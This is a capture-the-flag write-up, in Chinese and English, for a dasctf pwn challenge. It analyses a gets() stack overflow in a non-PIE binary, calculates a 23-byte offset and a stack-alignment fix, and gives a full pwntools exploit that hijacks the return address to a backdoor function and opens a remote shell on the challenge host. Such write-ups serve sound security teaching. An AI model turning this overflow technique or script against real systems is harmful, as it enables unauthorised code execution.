# Target Intelligence & Reconnaissance
(目标情报与侦察)

- Target Platform: CTF² (dasctf)

- Binary Type: ELF 64-bit LSB executable, dynamically linked, not stripped.

- Security Mitigations (checksec):

- No Canary found: 栈保护未开启，可以肆无忌惮地溢出。

- No PIE (0x400000): 程序加载基址固定，允许我们在 EXP 中直接硬编码函数绝对地址。

- NX unknown (or disabled): 栈具备执行权限，但本题采用 ret2text 策略，无需注入 Shellcode。

- Not Stripped: 符号表保留，这是极其关键的情报，意味着我们可以直接使用 nm 命令查看函数名。

#The Anatomy of the Bug
(漏洞解剖)

通过 nm 命令过滤符号表，发现了一个可疑的后门函数：

```text
0000000000401186 T fun
```
反汇编 main 函数，定位到致命漏洞点：

```assembly
401156: lea    -0xf(%rbp),%rax   ; buffer 起始地址为 rbp - 0xf (15 bytes)
401162: call   401050 <gets@plt> ; 调用 gets()，无边界检查
```
**漏洞成因 (Root Cause):**
程序使用 gets() 读取输入。由于没有限制长度，攻击者可以通过超长字符串覆盖 Return Address (RIP)，将其劫持到 fun 函数。

**偏移计算 (Offset Calculation) 与 幽灵截断 (Truncation):**

缓冲区大小：0xf (15 bytes)

保存的栈底指针 (saved rbp)：8 bytes

理论 Offset = 15 + 8 = **23 bytes**。

**细节坑点**: gets() 会在输入末尾自动补 \x00（空字符）。如果填充 24 字节，\x00 会精准覆盖返回地址的最低位（即 0x401186 变成 0x401100），导致跳转失败。因此必须严格填充 **23 字节**，让 \n 和 \x00 落在 saved rbp 内。

# Controlling the Chaos
(控制流劫持与策略)

**栈对齐微操 (Stack Alignment):**
当 RIP 被劫持到 0x401186 时，程序会先执行 push %rbp。这会使得栈指针 RSP 错位 8 字节。在 64 位系统中，当进入 system 内部触发 movaps 指令时，会因 16 字节对齐要求被破坏而直接崩溃（Core Dump）。

**解决方案:**
将返回地址加 1，即劫持到 0x401187（0x401186 + 1）。这完美跳过了 push %rbp，直接执行函数体，强行矫正了栈对齐。

# Weaponization & Exploit
(武器化与利用)

```python
from pwn import *
import ssl

# 1. 配置目标环境 (CTF2 平台强制 SSL)
HOST = '8775b11652ba4e9f26e7daa4.tcp-ctf2.dasctf.com'
PORT = 9999

def exploit():
    # 2. 配置 SSL 上下文
    ssl_context = ssl.create_default_context()
    ssl_context.check_hostname = False
    ssl_context.verify_mode = ssl.CERT_NONE

    print(f"[*] Connecting to {HOST}:{PORT} via TLS...")
    io = remote(HOST, PORT, ssl=True, ssl_context=ssl_context, sni=HOST)

    # 3. 核心 Payload 构造
    # 知识1: 23 字节填充，防止 gets 的 \x00 截断返回地址
    # 知识2: 使用 0x401186 + 1 跳过 push rbp，解决栈对齐崩溃
    backdoor_addr = 0x401186 + 1
    padding = 23
    
    payload = b'A' * padding + p64(backdoor_addr)
    
    # 4. 发送 Payload 并获取 Shell
    print("[*] Sending payload...")
    io.sendline(payload)
    
    # 5. 切换到交互模式 (拿到 Shell 后，用 cat flag 提取)
    io.interactive()

if __name__ == '__main__':
    exploit()
```